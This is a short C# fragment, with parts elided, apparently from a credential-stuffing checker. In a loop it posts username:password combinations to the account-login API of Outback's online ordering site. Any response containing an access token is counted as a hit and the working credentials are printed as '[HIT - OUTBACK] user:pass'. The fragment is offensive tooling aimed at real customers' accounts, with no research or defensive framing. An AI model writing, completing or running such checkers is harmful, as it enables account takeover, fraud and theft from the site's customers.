        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              if (httpRequest.Post("https://togo.outbackonlineordering.com/api/account/login", str, "application/x-www-form-urlencoded").ToString().Contains("access_token"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - OUTBACK] " + s[0] + ":" + s[1], Color.Green);
